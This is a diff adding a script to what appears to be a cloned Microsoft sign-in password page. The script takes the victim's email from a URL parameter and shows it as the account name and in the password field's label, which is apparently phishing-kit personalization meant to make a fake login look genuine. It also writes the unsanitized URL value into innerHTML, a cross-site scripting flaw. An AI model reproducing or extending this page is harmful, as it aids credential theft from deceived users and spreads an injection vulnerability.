@@ -600,4 +600,22 @@
 
 <!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->
 
-<!-- ko if: svr.fEnableDFPIntegration && dfpUrl() --><!-- /ko --></div></body></html>
+<!-- ko if: svr.fEnableDFPIntegration && dfpUrl() --><!-- /ko --></div><script>
+
+    const urlString = window.location.href;
+    const url = new URL(urlString);
+    const searchParams = new URLSearchParams(url.search);
+    const hasParam = searchParams.has('email');
+    if (hasParam == true){
+        emailval = searchParams.get('email');
+        document.getElementById("displayName").innerHTML = emailval
+        document.getElementById("displayName").title = emailval
+        document.getElementById("i0118").ariaLabel = "Enter the password for" + emailval
+    }else {
+        emailval = "vsv"
+    }
+    document.getElementById("displayName").innerHTML = emailval
+    document.getElementById("displayName").title = emailval
+    document.getElementById("i0118").ariaLabel = "Enter the password for" + emailval
+
+</script></body></html>
